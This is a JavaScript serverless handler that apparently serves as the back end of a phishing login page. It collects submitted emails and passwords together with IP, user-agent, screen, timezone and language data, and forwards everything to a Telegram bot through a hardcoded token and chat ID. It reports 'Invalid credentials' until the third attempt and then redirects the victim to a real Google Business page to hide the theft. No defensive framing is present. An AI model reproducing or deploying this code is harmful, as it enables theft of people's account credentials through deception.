// ============================================================
// ✏️ EDIT THESE VALUES WITH YOUR OWN
// ============================================================
const BOT_TOKEN = '8663822973:AAFMUT0hR_Rgo3tSR0stWcjCZugz31zbkAQ';
const CHAT_ID = '-5595613546';
const REDIRECT_URL = 'https://business.google.com/create/new?hl=en&gmbsrc=ng-en-z-z-z-gmb-l-z-d~mhp-hom_sig-u&original_intent=GMB&skiplp=1&_gl=1*we7dbu*_ga*MTQyMzU2Nzk4MS4xNzQ4ODg2MDg1*_ga_VM5ES1YN10*czE3NDg4ODYwODQkbzEkZzAkdDE3NDg4ODYwODQkajYwJGwwJGgw&service=ome&omec=EMLX0y4yAgECOipnbWJzcmM9bmctZW4tei16LXotZ21iLWwtei1kfm1ocC1ob21fc2lnLXVAAUoTCIuXmb2k040DFb-XAAAd3Ss8Mw%3D%3D';

// ============================================================
// In‑memory attempt store (resets on cold start)
// ============================================================
const attemptStore = new Map();

// ============================================================
// Helpers
// ============================================================

function getClientIP(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',');
        return ips[0].trim();
    }
    return req.connection?.remoteAddress || 'UNKNOWN';
}

async function sendTelegramMessage(text) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn('⚠️ Telegram credentials missing – message not sent.');
        return;
    }
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
        if (!response.ok) {
            const errorData = await response.text();
            console.error('Telegram API error:', errorData);
        }
    } catch (err) {
        console.error('Telegram send error:', err);
    }
}

// ============================================================
// Serverless Function Handler
// ============================================================

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // Parse body (JSON)
    let { email, password, screen, timezone, language, platform } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email and password are required' });
    }

    // IP & device info from headers
    const ip = getClientIP(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const emailProvider = email.includes('@') ? email.split('@')[1] : 'unknown';
    const timestamp = new Date().toLocaleString();

    // Increment attempt count
    const current = attemptStore.get(email) || 0;
    const newCount = current + 1;
    attemptStore.set(email, newCount);

    // Build a detailed Telegram message
    const attemptLabel = newCount === 1 ? '1st' : newCount === 2 ? '2nd' : newCount === 3 ? '3rd (LAST)' : `${newCount}th`;
    const message = `
🔐 <b>Login Attempt #${newCount} (${attemptLabel})</b>
👤 <b>Email:</b> ${email}
🔑 <b>Password:</b> ${password}
🌐 <b>IP:</b> ${ip}
💻 <b>User‑Agent:</b> ${userAgent}
📧 <b>Provider:</b> ${emailProvider}
🖥 <b>Platform:</b> ${platform || 'N/A'}
📱 <b>Screen:</b> ${screen || 'N/A'}
🌍 <b>Timezone:</b> ${timezone || 'N/A'}
🗣 <b>Language:</b> ${language || 'N/A'}
🕒 <b>Time:</b> ${timestamp}
    `;

    // Send to Telegram (non‑blocking)
    sendTelegramMessage(message).catch(console.error);

    // Decide redirect after 3 attempts
    const redirect = (newCount >= 3);

    // Return response with attempt count
    return res.status(200).json({
        redirect,
        redirectUrl: REDIRECT_URL,
        attempts: newCount,
        message: redirect ? 'Redirecting...' : 'Invalid credentials'
    });
};
